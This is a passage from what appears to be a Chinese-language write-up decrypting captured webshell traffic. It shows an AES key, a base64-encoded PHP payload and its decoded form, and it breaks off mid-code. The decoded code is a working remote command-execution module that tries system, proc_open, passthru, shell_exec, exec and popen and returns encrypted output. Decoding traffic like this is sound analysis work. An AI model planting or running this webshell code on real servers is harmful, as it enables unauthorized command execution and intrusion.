operator\">/</span>R/fFNG4xf3L5miXeJY2JaiHuA7duJH6kUpBfGq7jS+knRz/8azOc2n9TH/8J74h6wr8kHdStHAPgA7wetx+tqL4Y6CUGM3Hwuv4VpB2ZgQv/427BYRQ41nrPhMhYnAfFqIMpb1QfyLfB199FTzOkTYb20jHZolby3ZQUrWp5G2WOUmdg6/CNOoABPQWLJbiEurOQK7cR35pGr5XEix0UpfI3BvR8z+fGNAwxbVWAT/A3ZK1KLllQdkAJt8x+nUShictq2xUmZN3PPCaBtpSYDFrGdPAp+Gof69u2Eb6WH89pxNhA53tAWHUi2+0ExN4g/ZJUjfAtZqICWQKdCcmEaBkh/6v7mFqMmHon4THlcabBobb+Lp7EO6IntTWVrCdx4+oMpoEQKq5TZd0IIGEmxSJrrwel6r/gorqY0NTCE2i0yQ0MHxdgGQj6/ZA5+8Ani6/AMkeNF7DGeozFr53NycnWO6wFeXmoBeJ2w2Hmj0RVecPwU809v+hOxL45Tn6g9ZSSG7hFZJkUVjD0NO3u3hhcN65wbPsILHJZpTo/KiocBy2S1+j747iMfzKmgmqsBcI1y+Vx3C/5Km2rsaagSSxXQx1eqTF3Y07Aq4h5SJp5x3eHm50WCC2Iyh7Vb37+a9jrFu76U+1AiwMM8pYCLWIxrYbcU/wo2eLnpWlRnGEUrtijjdrwegXDCAiEqvhqp11DUU3KUy5UwfcPZeeMo5a5T32TVbWDX2eyMCNXMyx5UzCpspxh4Qj+SWgaXswoIab5Gx5rq7h8lJNL9P2/js0D7VgO1AwdeUI8RmsK1TygwQBGHu92S2/PR1YTzQ3dB5U9mwLM2nUxi0U0BrHI/4hh/Ilpw4msZNk69IlpXcfNyPvVFKxZaU=<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>ASE加密模式CBC，填充：okcs7padding，密钥长度：128位，密钥：a02439ec229d8be0：</p>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\">Pssert<span class=\"token punctuation\">|</span>eval<span class=\"token punctuation\">(</span>base64_decode<span class=\"token punctuation\">(</span><span class=\"token string\">'QGVycm9yX3JlcG9ydGluZygwKTsNCg0KZnVuY3Rpb24gZ2V0U2FmZVN0cigkc3RyKXsNCiAgICAkczEgPSBpY29udigndXRmLTgnLCdnYmsvL0lHTk9SRScsJHN0cik7DQogICAgJHMwID0gaWNvbnYoJ2diaycsJ3V0Zi04Ly9JR05PUkUnLCRzMSk7DQogICAgaWYoJHMwID09ICRzdHIpew0KICAgICAgICByZXR1cm4gJHMwOw0KICAgIH1lbHNlew0KICAgICAgICByZXR1cm4gaWNvbnYoJ2diaycsJ3V0Zi04Ly9JR05PUkUnLCRzdHIpOw0KICAgIH0NCn0NCmZ1bmN0aW9uIG1haW4oJGNtZCwkcGF0aCkNCnsNCiAgICBAc2V0X3RpbWVfbGltaXQoMCk7DQogICAgQGlnbm9yZV91c2VyX2Fib3J0KDEpOw0KICAgIEBpbmlfc2V0KCdtYXhfZXhlY3V0aW9uX3RpbWUnLCAwKTsNCiAgICAkcmVzdWx0ID0gYXJyYXkoKTsNCiAgICAkUGFkdEpuID0gQGluaV9nZXQoJ2Rpc2FibGVfZnVuY3Rpb25zJyk7DQogICAgaWYgKCEgZW1wdHkoJFBhZHRKbikpIHsNCiAgICAgICAgJFBhZHRKbiA9IHByZWdfcmVwbGFjZSgnL1ssIF0rLycsICcsJywgJFBhZHRKbik7DQogICAgICAgICRQYWR0Sm4gPSBleHBsb2RlKCcsJywgJFBhZHRKbik7DQogICAgICAgICRQYWR0Sm4gPSBhcnJheV9tYXAoJ3RyaW0nLCAkUGFkdEpuKTsNCiAgICB9IGVsc2Ugew0KICAgICAgICAkUGFkdEpuID0gYXJyYXkoKTsNCiAgICB9DQogICAgJGMgPSAkY21kOw0KICAgIGlmIChGQUxTRSAhPT0gc3RycG9zKHN0cnRvbG93ZXIoUEhQX09TKSwgJ3dpbicpKSB7DQogICAgICAgICRjID0gJGMgLiAiIDI+JjFcbiI7DQogICAgfQ0KICAgICRKdWVRREJIID0gJ2lzX2NhbGxhYmxlJzsNCiAgICAkQnZjZSA9ICdpbl9hcnJheSc7DQogICAgaWYgKCRKdWVRREJIKCdzeXN0ZW0nKSBhbmQgISAkQnZjZSgnc3lzdGVtJywgJFBhZHRKbikpIHsNCiAgICAgICAgb2Jfc3RhcnQoKTsNCiAgICAgICAgc3lzdGVtKCRjKTsNCiAgICAgICAgJGtXSlcgPSBvYl9nZXRfY29udGVudHMoKTsNCiAgICAgICAgb2JfZW5kX2NsZWFuKCk7DQogICAgfSBlbHNlIGlmICgkSnVlUURCSCgncHJvY19vcGVuJykgYW5kICEgJEJ2Y2UoJ3Byb2Nfb3BlbicsICRQYWR0Sm4pKSB7DQogICAgICAgICRoYW5kbGUgPSBwcm9jX29wZW4oJGMsIGFycmF5KA0KICAgICAgICAgICAgYXJyYXkoDQogICAgICAgICAgICAgICAgJ3BpcGUnLA0KICAgICAgICAgICAgICAgICdyJw0KICAgICAgICAgICAgKSwNCiAgICAgICAgICAgIGFycmF5KA0KICAgICAgICAgICAgICAgICdwaXBlJywNCiAgICAgICAgICAgICAgICAndycNCiAgICAgICAgICAgICksDQogICAgICAgICAgICBhcnJheSgNCiAgICAgICAgICAgICAgICAncGlwZScsDQogICAgICAgICAgICAgICAgJ3cnDQogICAgICAgICAgICApDQogICAgICAgICksICRwaXBlcyk7DQogICAgICAgICRrV0pXID0gTlVMTDsNCiAgICAgICAgd2hpbGUgKCEgZmVvZigkcGlwZXNbMV0pKSB7DQogICAgICAgICAgICAka1dKVyAuPSBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KICAgICAgICB9DQogICAgICAgIEBwcm9jX2Nsb3NlKCRoYW5kbGUpOw0KICAgIH0gZWxzZSBpZiAoJEp1ZVFEQkgoJ3Bhc3N0aHJ1JykgYW5kICEgJEJ2Y2UoJ3Bhc3N0aHJ1JywgJFBhZHRKbikpIHsNCiAgICAgICAgb2Jfc3RhcnQoKTsNCiAgICAgICAgcGFzc3RocnUoJGMpOw0KICAgICAgICAka1dKVyA9IG9iX2dldF9jb250ZW50cygpOw0KICAgICAgICBvYl9lbmRfY2xlYW4oKTsNCiAgICB9IGVsc2UgaWYgKCRKdWVRREJIKCdzaGVsbF9leGVjJykgYW5kICEgJEJ2Y2UoJ3NoZWxsX2V4ZWMnLCAkUGFkdEpuKSkgew0KICAgICAgICAka1dKVyA9IHNoZWxsX2V4ZWMoJGMpOw0KICAgIH0gZWxzZSBpZiAoJEp1ZVFEQkgoJ2V4ZWMnKSBhbmQgISAkQnZjZSgnZXhlYycsICRQYWR0Sm4pKSB7DQogICAgICAgICRrV0pXID0gYXJyYXkoKTsNCiAgICAgICAgZXhlYygkYywgJGtXSlcpOw0KICAgICAgICAka1dKVyA9IGpvaW4oY2hyKDEwKSwgJGtXSlcpIC4gY2hyKDEwKTsNCiAgICB9IGVsc2UgaWYgKCRKdWVRREJIKCdleGVjJykgYW5kICEgJEJ2Y2UoJ3BvcGVuJywgJFBhZHRKbikpIHsNCiAgICAgICAgJGZwID0gcG9wZW4oJGMsICdyJyk7DQogICAgICAgICRrV0pXID0gTlVMTDsNCiAgICAgICAgaWYgKGlzX3Jlc291cmNlKCRmcCkpIHsNCiAgICAgICAgICAgIHdoaWxlICghIGZlb2YoJGZwKSkgew0KICAgICAgICAgICAgICAgICRrV0pXIC49IGZyZWFkKCRmcCwgMTAyNCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgQHBjbG9zZSgkZnApOw0KICAgIH0gZWxzZSB7DQogICAgICAgICRrV0pXID0gMDsNCiAgICAgICAgJHJlc3VsdFsic3RhdHVzIl0gPSBiYXNlNjRfZW5jb2RlKCJmYWlsIik7DQogICAgICAgICRyZXN1bHRbIm1zZyJdID0gYmFzZTY0X2VuY29kZSgibm9uZSBvZiBwcm9jX29wZW4vcGFzc3RocnUvc2hlbGxfZXhlYy9leGVjL2V4ZWMgaXMgYXZhaWxhYmxlIik7DQogICAgICAgICRrZXkgPSAkX1NFU1NJT05bJ2snXTsNCiAgICAgICAgZWNobyBlbmNyeXB0KGpzb25fZW5jb2RlKCRyZXN1bHQpLCAka2V5KTsNCiAgICAgICAgcmV0dXJuOw0KICAgICAgICANCiAgICB9DQogICAgJHJlc3VsdFsic3RhdHVzIl0gPSBiYXNlNjRfZW5jb2RlKCJzdWNjZXNzIik7DQogICAgJHJlc3VsdFsibXNnIl0gPSBiYXNlNjRfZW5jb2RlKGdldFNhZmVTdHIoJGtXSlcpKTsNCiAgICBlY2hvIGVuY3J5cHQoanNvbl9lbmNvZGUoJHJlc3VsdCksICAkX1NFU1NJT05bJ2snXSk7DQp9DQoNCmZ1bmN0aW9uIGVuY3J5cHQoJGRhdGEsJGtleSkNCnsNCglpZighZXh0ZW5zaW9uX2xvYWRlZCgnb3BlbnNzbCcpKQ0KICAgIAl7DQogICAgCQlmb3IoJGk9MDskaTxzdHJsZW4oJGRhdGEpOyRpKyspIHsNCiAgICAJCQkgJGRhdGFbJGldID0gJGRhdGFbJGldXiRrZXlbJGkrMSYxNV07IA0KICAgIAkJCX0NCgkJCXJldHVybiAkZGF0YTsNCiAgICAJfQ0KICAgIGVsc2UNCiAgICAJew0KICAgIAkJcmV0dXJuIG9wZW5zc2xfZW5jcnlwdCgkZGF0YSwgIkFFUzEyOCIsICRrZXkpOw0KICAgIAl9DQp9JGNtZD0iWTJRZ0wyUWdJa1E2WEhCb2NITjBkV1I1WDNCeWIxeFhWMWRjSWlaM2FHOWhiV2s9IjskY21kPWJhc2U2NF9kZWNvZGUoJGNtZCk7JHBhdGg9IlJEb3ZjR2h3YzNSMVpIbGZjSEp2TDFkWFZ5OD0iOyRwYXRoPWJhc2U2NF9kZWNvZGUoJHBhdGgpOw0KbWFpbigkY21kLCRwYXRoKTs='</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>将内容base64解密：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">@<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getSafeStr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$s1</span> <span class=\"token operator\">=</span> <span class=\"token function\">iconv</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'utf-8'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'gbk//IGNORE'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$s0</span> <span class=\"token operator\">=</span> <span class=\"token function\">iconv</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'gbk'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'utf-8//IGNORE'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$s1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s0</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$s0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">iconv</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'gbk'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'utf-8//IGNORE'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$path</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    @<span class=\"token function\">set_time_limit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    @<span class=\"token function\">ignore_user_abort</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    @<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'max_execution_time'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$PadtJn</span> <span class=\"token operator\">=</span> @<span class=\"token function\">ini_get</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'disable_functions'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span> <span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$PadtJn</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$PadtJn</span> <span class=\"token operator\">=</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[, ]+/'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">','</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$PadtJn</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$PadtJn</span> <span class=\"token operator\">=</span> <span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">','</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$PadtJn</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$PadtJn</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_map</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'trim'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$PadtJn</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$PadtJn</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$cmd</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token constant boolean\">FALSE</span> <span class=\"token operator\">!==</span> <span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token constant\">PHP_OS</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'win'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$c</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\" 2&gt;&amp;1\\n\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token variable\">$JueQDBH</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'is_callable'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$Bvce</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'in_array'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$JueQDBH</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'system'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token operator\">!</span> <span class=\"token variable\">$Bvce</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'system'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$PadtJn</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">ob_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$kWJW</span> <span class=\"token operator\">=</span> <span class=\"token function\">ob_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">ob_end_clean</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$JueQDBH</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'proc_open'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token operator\">!</span> <span class=\"token variable\">$Bvce</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'proc_open'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$PadtJn</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$handle</span> <span class=\"token operator\">=</span> <span class=\"token function\">proc_open</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span>\n                <span class=\"token string single-quoted-string\">'pipe'</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string single-quoted-string\">'r'</span>\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span>\n                <span class=\"token string single-quoted-string\">'pipe'</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string single-quoted-string\">'w'</span>\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span>\n                <span class=\"token string single-quoted-string\">'pipe'</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string single-quoted-string\">'w'</span>\n            <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$pipes</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$kWJW</span> <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span> <span class=\"token function\">feof</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pipes</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token variable\">$kWJW</span> <span class=\"token operator\">.=</span> <span class=\"token function\">fread</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pipes</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        @<span class=\"token function\">proc_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$handle</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$JueQDBH</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'passthru'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token operator\">!</span> <span class=\"token variable\">$Bvce</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'passthru'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$PadtJn</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">ob_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">passthru</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$kWJW</span> <span class=\"token operator\">=</span> <span class=\"token function\">ob_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">ob_end_clean</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$JueQDBH</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'shell_exec'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token operator\">!</span> <span class=\"token variable\">$Bvce</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'shell_exec'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$PadtJn</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$kWJW</span> <span class=\"token operator\">=</span> <span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$JueQDBH</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'exec'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token operator\">!</span> <span class=\"token variable\">$Bvce</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'exec'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$PadtJn</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$kWJW</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$kWJW</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$kWJW</span> <span class=\"token operator\">=</span> <span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$kWJW</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$JueQDBH</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'exec'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token operator\">!</span> <span class=\"token variable\">$Bvce</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'popen'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$PadtJn</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$fp</span> <span class=\"token operator\">=</span> <span class=\"token function\">popen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'r'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$kWJW</span> <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">is_resource</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span> <span class=\"token function\">feof</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token variable\">$kWJW</span> <span class=\"token operator\">.=</span> <span class=\"token function\">fread</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fp</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        @<span class=\"token function\">pclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$kWJW</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$result</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"status\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fail\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$result</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"msg\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"none of proc_open/passthru/shell_exec/exec/exec is available\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$key</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'k'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span><span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n        \n    <span class=\"token punctuation\">}</span>\n    <span class=\"token variable\">$result</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"status\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"success\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$result</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"msg\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">getSafeStr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$kWJW</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span><span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'k'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">encrypt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token 